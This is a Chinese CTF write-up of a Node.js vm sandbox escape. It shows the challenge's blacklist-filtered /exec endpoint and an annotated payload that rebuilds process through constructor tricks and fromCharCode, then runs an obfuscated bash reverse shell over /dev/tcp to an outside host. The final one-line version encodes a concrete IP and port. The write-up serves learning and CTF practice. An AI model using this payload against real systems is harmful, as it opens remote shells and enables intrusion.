## 沙箱逃逸

### vm逃逸（一）

> 代表题目：2023云演：[Esc4pe_T0_Mong0](https://www.yunyansec.com/#/experiment/expdetail/6)

- 考察知识点
  - node代码审计
  - constructor沙箱逃逸
  - 绕过waf
  - 反弹shell
  - mongodb

```js
Source Code:
//const { MongoClient } = require("mongodb");
//const client = new MongoClient("mongodb://localhost:27017/");

const vm = require('vm');

const express = require("express");
const bodyParser = require('body-parser');
const app = express();

// 黑名单过滤、限制长度
const isValidCode = (code) => {
    const isLengthValid = code.length < 365;
    const isASCII = /^[\x20-\x7e]+$/.test(code);
    const containsInvalidChars = /[.\[\]{}\s;`'"/\\_<>?:]/.test(code);
    const doesNotContainImport = !code.toLowerCase().includes("import");
    const doesNotContainUnescape = !/%(?:d0|d1|%[89abAB][0-9a-fA-F])/.test(code);

    return (
      isLengthValid &&
      isASCII &&
      !containsInvalidChars &&
      doesNotContainImport &&
      doesNotContainUnescape
    );
};

app.use(bodyParser.json());

app.get('/', function (req, res) {
    res.sendFile( __dirname + "/static/index.html" );
});

app.get('/readfile', function (req, res) {
    res.sendFile( __dirname + "/app.js" );
});

app.get('/exec', (req, res) => {
    const code = req.query.code;
    if (!code) {
        res.status(400).json({ error: 'Code is required.' });
        return;
    }

    if (isValidCode(code)) {
        try {
            const sandbox = {};
            const script = new vm.Script(code);
            // 执行命令
            const result = script.runInNewContext(sandbox);
            res.json({ result });
        } catch (err) {
            res.status(400).json({ error: err.message });
        }
    } else {
        res.status(400).json({ error: 'you cant bypass my vm best waf!' });
        return;
    }
});

//app.get('/getflag', function (req, res) {
//    todo...
//});

app.listen(3000, () => console.log(`nodeapp listening on http://localhost:3000`));
```

**exp**

```js
	// 将String构造函数添加到当前作用域链的顶部,
	// 从而可以通过当前上下文中的变量名直接访问 String 对象中的属性和方法
with(String)
	// fromCharCode：用于将 Unicode 编码转换为对应的字符
	// 此处是将fromCharCode 方法添加到作用域链中
with(f=fromCharCode,this)
    // 将constructor属性添加到作用域中
with(constructor)
    // 使用构造方法构造出：process，也就是return process()
with(constructor(f(r=114,e=101,t=116,117,r,110,32,p=112,r,111,c=99,e,s=115,s))())
    // 将mainModule 添加到作用域中
with(mainModule)
    // 执行mainModule.require("child_process").execSync("whoami").toString();类似的命令
    // 不过这里是使用反弹shell
    // require("child_process").exec(bash -c "bash -i >& /dev/tcp/XXX.XXX.XXX.XXX/XXXX 0>&1")
with(require(f(c,h=104,105,108,100,95,p,r,111,c,e,s,s)))exec(f(98,97,s,h,32,45,c,32,34,98,97,s,h,32,45,105,32,62,38,32,47,100,e,118,47,t,c,p,47,X,X,46,X,X,X,46,X,X,46,X,X,X,47,X,X,X,X,32,48,62,38,b,34))

with(String)with(f=fromCharCode,this)with(constructor)with(constructor(f(r=114,e=101,t=116,117,r,110,32,p=112,r,111,c=99,e,s=115,s))())with(mainModule)with(require(f(c,h=104,105,108,100,95,p,r,111,c,e,s,s)))exec(f(98,97,s,h,32,45,c,32,34,98,97,s,h,32,45,105,32,62,38,32,47,100,e,118,47,t,c,p,47,49,49,50,46,49,50,52,46,53,50,46,50,48,48,47,50,48,48,48,48,32,48,62,38,b,34))

```





